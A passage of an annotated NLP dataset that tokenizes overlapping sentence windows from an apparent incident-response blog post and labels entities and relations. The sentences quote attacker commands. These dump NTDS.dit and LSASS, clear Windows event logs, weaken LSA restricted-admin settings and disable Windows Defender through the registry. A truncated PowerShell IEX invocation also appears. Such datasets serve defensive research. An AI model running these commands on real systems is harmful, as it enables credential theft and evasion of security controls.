"Comsvcs.dll", "pos": [0, 1], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [61, 61], "name": "LSASS", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "comsvcs.dll", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "rundll32.exe", "pos": [4, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "dump", "pos": [11, 12], "index": "8_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [94, 94], "name": "NTDS.dit", "pos": [7, 8], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "h": 0, "t": 3}, {"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "t": 6, "h": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 9}]}, {"title": "075-17", "sents": [["001", ")", "The", "actor", "attempted", "to", "extract", "credentials", "from", "the", "victim", "in", "two", "ways", ":", "Accessing", "the", "active", "directory", "global", "catalog", "file", "ntds.dit", "and", "utilizing", "comsvcs.dll", "."], ["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "actor", "pos": [3, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [7, 7], "name": "credentials", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "ntds.dit", "pos": [22, 23], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [25, 25], "name": "comsvcs.dll", "pos": [25, 26], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "Comsvcs.dll", "pos": [0, 1], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [34, 34], "name": "LSASS", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "comsvcs.dll", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "rundll32.exe", "pos": [4, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "dump", "pos": [11, 12], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [67, 67], "name": "NTDS.dit", "pos": [7, 8], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "t": 6, "h": 7}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 9}]}, {"title": "075-18", "sents": [["Comsvcs.dll", "is", "a", "well-known", "way", "to", "extract", "LSASS", "(", "Local", "Security", "Authority", "Subsystem", "Service", ")", "data", "."], ["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Comsvcs.dll", "pos": [0, 1], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [7, 7], "name": "LSASS", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "comsvcs.dll", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "rundll32.exe", "pos": [4, 5], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "dump", "pos": [11, 12], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [40, 40], "name": "NTDS.dit", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [167, 167], "name": "adversary", "pos": [7, 8], "index": "6_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [2, 3, 4, 5, 6, 7], "t": 5, "h": 6}]}, {"title": "075-19", "sents": [["By", "invoking", "comsvcs.dll", "with", "rundll32.exe", ",", "an", "adversary", "can", "create", "a", "dump", "of", "any", "process", "."], ["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "comsvcs.dll", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "rundll32.exe", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "dump", "pos": [11, 12], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [23, 23], "name": "NTDS.dit", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [150, 150], "name": "adversary", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [177, 177], "name": "attacker", "pos": [4, 5], "index": "5_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [184, 184], "name": "security logs", "pos": [11, 13], "index": "6_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1, 2, 3, 4, 5, 6], "t": 3, "h": 4}, {"r": "RD", "evidence": [6, 7], "h": 4, "t": 6}, {"r": "RD", "evidence": [6, 7], "h": 4, "t": 6}, {"r": "WR", "evidence": [6, 7], "h": 4, "t": 6}, {"r": "UK", "evidence": [7], "h": 5, "t": 6}]}, {"title": "075-20", "sents": [["We", "also", "observed", "attempts", "to", "dump", "the", "NTDS.dit", ",", "which", "is", "a", "database", "of", "Active", "Directory", "information", "."], ["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [7, 7], "name": "NTDS.dit", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [134, 134], "name": "adversary", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "attacker", "pos": [4, 5], "index": "2_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [168, 168], "name": "security logs", "pos": [11, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [205, 205], "name": "adversary", "pos": [31, 32], "index": "4_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [212, 212], "name": "Windows Registry", "pos": [38, 40], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [224, 224], "name": "lateral movement", "pos": [50, 52], "index": "6_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [227, 227], "name": "privilege escalation activities", "pos": [53, 56], "index": "7_0"}]], "labels": [{"r": "RD", "evidence": [0, 1, 2, 3, 4, 5], "t": 0, "h": 1}, {"r": "RD", "evidence": [5, 6], "h": 1, "t": 3}, {"r": "RD", "evidence": [5, 6], "h": 1, "t": 3}, {"r": "WR", "evidence": [5, 6], "h": 1, "t": 3}, {"r": "UK", "evidence": [6], "h": 2, "t": 3}, {"r": "RD", "evidence": [7], "h": 4, "t": 5}, {"r": "WR", "evidence": [7], "h": 4, "t": 5}, {"r": "FR", "evidence": [7], "h": 4, "t": 6}, {"r": "FR", "evidence": [7], "h": 4, "t": 7}]}, {"title": "075-21", "sents": [["Examples", "of", "the", "command-line", "syntax", "used", "in", "these", "cases", "are", "below.cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp", "'", "q", "q", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."], ["Disabling", "this", "security", "control", "allows", "attackers", "to", "leverage", "pass-the-hash", "attacks", "and", "hinder", "RDP", "'s", "security", "on", "systems.cmd.exe", "/q", "/c", "powershell", "new-itemproperty", "-path", "hklm", ":", "\\system\\currentcontrolset\\control\\lsa", "-name", "disablerestrictedadmin", "-value", "0", "-propertytype", "dword", "-force", "1", ">", "\\\\127", "."]], "vertexSet": [[{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "adversary", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "attacker", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [150, 150], "name": "security logs", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [187, 187], "name": "adversary", "pos": [31, 32], "index": "3_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [194, 194], "name": "Windows Registry", "pos": [38, 40], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [206, 206], "name": "lateral movement", "pos": [50, 52], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [209, 209], "name": "privilege escalation activities", "pos": [53, 56], "index": "6_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [218, 218], "name": "attackers", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [222, 222], "name": "attacks", "pos": [9, 10], "index": "8_0"}]], "labels": [{"r": "RD", "evidence": [4, 5], "h": 0, "t": 2}, {"r": "RD", "evidence": [4, 5], "h": 0, "t": 2}, {"r": "WR", "evidence": [4, 5], "h": 0, "t": 2}, {"r": "UK", "evidence": [5], "h": 1, "t": 2}, {"r": "RD", "evidence": [6], "h": 3, "t": 4}, {"r": "WR", "evidence": [6], "h": 3, "t": 4}, {"r": "FR", "evidence": [6], "h": 3, "t": 5}, {"r": "FR", "evidence": [6], "h": 3, "t": 6}, {"r": "FR", "evidence": [7], "h": 7, "t": 8}]}, {"title": "075-22", "sents": [["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1cmd.exe", "/q", "/c", "powershell", "ntdsutil.exe", "'ac", "i", "ntds", "'", "'ifm", "'", "'create", "full", "c", ":", "emp_logs", "'", "q", "q", "1", ">", "\\\\127", "."], ["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."], ["Disabling", "this", "security", "control", "allows", "attackers", "to", "leverage", "pass-the-hash", "attacks", "and", "hinder", "RDP", "'s", "security", "on", "systems.cmd.exe", "/q", "/c", "powershell", "new-itemproperty", "-path", "hklm", ":", "\\system\\currentcontrolset\\control\\lsa", "-name", "disablerestrictedadmin", "-value", "0", "-propertytype", "dword", "-force", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1", "We", "also", "observed", "the", "attacker", "disabling", "Windows", "Defender", "by", "modifying", "the", "Windows", "Registry", "on", "compromised", "systems", "."]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "adversary", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [110, 110], "name": "attacker", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [117, 117], "name": "security logs", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [154, 154], "name": "adversary", "pos": [31, 32], "index": "3_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [161, 161], "name": "Windows Registry", "pos": [38, 40], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [173, 173], "name": "lateral movement", "pos": [50, 52], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [176, 176], "name": "privilege escalation activities", "pos": [53, 56], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [185, 185], "name": "attackers", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [189, 189], "name": "attacks", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [230, 230], "name": "attacker", "pos": [14, 15], "index": "9_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [232, 232], "name": "Windows Defender", "pos": [16, 18], "index": "10_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [237, 237], "name": "Windows Registry", "pos": [21, 23], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [3, 4], "h": 0, "t": 2}, {"r": "RD", "evidence": [3, 4], "h": 0, "t": 2}, {"r": "WR", "evidence": [3, 4], "h": 0, "t": 2}, {"r": "UK", "evidence": [4], "h": 1, "t": 2}, {"r": "RD", "evidence": [5], "h": 3, "t": 4}, {"r": "WR", "evidence": [5], "h": 3, "t": 4}, {"r": "FR", "evidence": [5], "h": 3, "t": 5}, {"r": "FR", "evidence": [5], "h": 3, "t": 6}, {"r": "FR", "evidence": [6], "h": 7, "t": 8}, {"r": "RD", "evidence": [6, 7], "h": 8, "t": 11}, {"r": "CO", "evidence": [6, 7], "h": 8, "t": 9}, {"r": "UK", "evidence": [7], "h": 9, "t": 10}, {"r": "WR", "evidence": [7], "h": 9, "t": 11}]}, {"title": "075-23", "sents": [["Defense", "evasion", "ATT", "&", "CK", "Technique", ":", "Indicator", "Removal", "on", "Host", ":", "Clear", "Windows", "Event", "Logs", "(", "T1070", "."], ["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."], ["Disabling", "this", "security", "control", "allows", "attackers", "to", "leverage", "pass-the-hash", "attacks", "and", "hinder", "RDP", "'s", "security", "on", "systems.cmd.exe", "/q", "/c", "powershell", "new-itemproperty", "-path", "hklm", ":", "\\system\\currentcontrolset\\control\\lsa", "-name", "disablerestrictedadmin", "-value", "0", "-propertytype", "dword", "-force", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1", "We", "also", "observed", "the", "attacker", "disabling", "Windows", "Defender", "by", "modifying", "the", "Windows", "Registry", "on", "compromised", "systems", "."], ["This", "was", "performed", "using", "the", "following", "commands", ":", "C", ":", "\\Windows\\system32", "eg.exe", "delete", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender", "/fC", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\Real-Time", "Protection", "/v", "DisableRoutinelyTakingAction", "/t", "REG_DWORD", "/d", "1", "/f", "C", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\SpyNet", "/v", "DisableBlockAtFirstSeen", "/t", "REG_DWORD", "/d", "1", "/f", "We", "also", "observed", "the", "threat", "actor", "attempting", "to", "evade", "detection", "while", "enumerating", "the", "e"]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "adversary", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [78, 78], "name": "attacker", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [85, 85], "name": "security logs", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "adversary", "pos": [31, 32], "index": "3_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [129, 129], "name": "Windows Registry", "pos": [38, 40], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [141, 141], "name": "lateral movement", "pos": [50, 52], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [144, 144], "name": "privilege escalation activities", "pos": [53, 56], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [153, 153], "name": "attackers", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [157, 157], "name": "attacks", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [198, 198], "name": "attacker", "pos": [14, 15], "index": "9_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [200, 200], "name": "Windows Defender", "pos": [16, 18], "index": "10_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [205, 205], "name": "Windows Registry", "pos": [21, 23], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [260, 260], "name": "actor", "pos": [49, 50], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [2, 3], "h": 0, "t": 2}, {"r": "RD", "evidence": [2, 3], "h": 0, "t": 2}, {"r": "WR", "evidence": [2, 3], "h": 0, "t": 2}, {"r": "UK", "evidence": [3], "h": 1, "t": 2}, {"r": "RD", "evidence": [4], "h": 3, "t": 4}, {"r": "WR", "evidence": [4], "h": 3, "t": 4}, {"r": "FR", "evidence": [4], "h": 3, "t": 5}, {"r": "FR", "evidence": [4], "h": 3, "t": 6}, {"r": "FR", "evidence": [5], "h": 7, "t": 8}, {"r": "RD", "evidence": [5, 6], "h": 8, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 8, "t": 9}, {"r": "UK", "evidence": [6], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "h": 9, "t": 11}, {"r": "RD", "evidence": [6, 7], "t": 11, "h": 12}, {"r": "RD", "evidence": [6, 7], "t": 11, "h": 12}, {"r": "WR", "evidence": [6, 7], "t": 11, "h": 12}]}, {"title": "075-24", "sents": [["001", ")", "ATT", "&", "CK", "Technique", ":", "Modify", "Registry", "(", "T1112", ")", "ATT", "&", "CK", "Technique", ":", "Impair", "Defenses", "or", "Modify", "Tools", "(", "T1562", "."], ["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."], ["Disabling", "this", "security", "control", "allows", "attackers", "to", "leverage", "pass-the-hash", "attacks", "and", "hinder", "RDP", "'s", "security", "on", "systems.cmd.exe", "/q", "/c", "powershell", "new-itemproperty", "-path", "hklm", ":", "\\system\\currentcontrolset\\control\\lsa", "-name", "disablerestrictedadmin", "-value", "0", "-propertytype", "dword", "-force", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1", "We", "also", "observed", "the", "attacker", "disabling", "Windows", "Defender", "by", "modifying", "the", "Windows", "Registry", "on", "compromised", "systems", "."], ["This", "was", "performed", "using", "the", "following", "commands", ":", "C", ":", "\\Windows\\system32", "eg.exe", "delete", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender", "/fC", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\Real-Time", "Protection", "/v", "DisableRoutinelyTakingAction", "/t", "REG_DWORD", "/d", "1", "/f", "C", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\SpyNet", "/v", "DisableBlockAtFirstSeen", "/t", "REG_DWORD", "/d", "1", "/f", "We", "also", "observed", "the", "threat", "actor", "attempting", "to", "evade", "detection", "while", "enumerating", "the", "e"], ["In", "this", "case", ",", "the", "Windows", "Command", "Processor", "was", "used", "to", "invoke", "PowerShell", ",", "which", "then", "leveraged", "Invoke-Expression", "(", "IEX", ")", "for", "this", "purpose.cmd.exe", "/Q", "/c", "powershell.exe", "-exec", "bypass", "-noni", "-nop", "-w", "1", "-C", "IEX", "(", "[", "Net", "."]], "vertexSet": [[{"type": "MP", 